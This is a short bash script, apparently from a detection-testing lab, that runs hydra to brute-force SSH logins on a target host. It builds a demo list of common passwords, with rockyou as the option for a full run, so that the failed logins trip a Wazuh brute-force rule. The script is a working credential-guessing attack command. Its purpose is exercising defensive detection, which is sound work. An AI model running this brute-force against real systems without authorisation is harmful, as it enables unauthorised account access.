#!/usr/bin/env bash
# SSH brute-force with hydra. THE headline detection (Wazuh host rules).
# Uses a short built-in list by default so the demo finishes fast; pass
# WORDLIST=/usr/share/wordlists/rockyou.txt for the full run.
source "$(dirname "$0")/_lib.sh"

USER="${SSH_USER:-testuser}"
WORDLIST="${WORDLIST:-}"

if [ -z "$WORDLIST" ]; then
  # small demo list -> plenty of failed logins to trip the brute-force rule
  WORDLIST="$(mktemp)"
  printf '%s\n' 123456 password admin root toor letmein qwerty abc123 password1 welcome \
    monkey dragon master hello login passw0rd trustno1 iloveyou starwars > "$WORDLIST"
  log "using built-in demo wordlist (set WORDLIST=... for rockyou)"
fi

run_logged "ssh_bruteforce" hydra -l "$USER" -P "$WORDLIST" -t 4 -f "ssh://$TARGET"
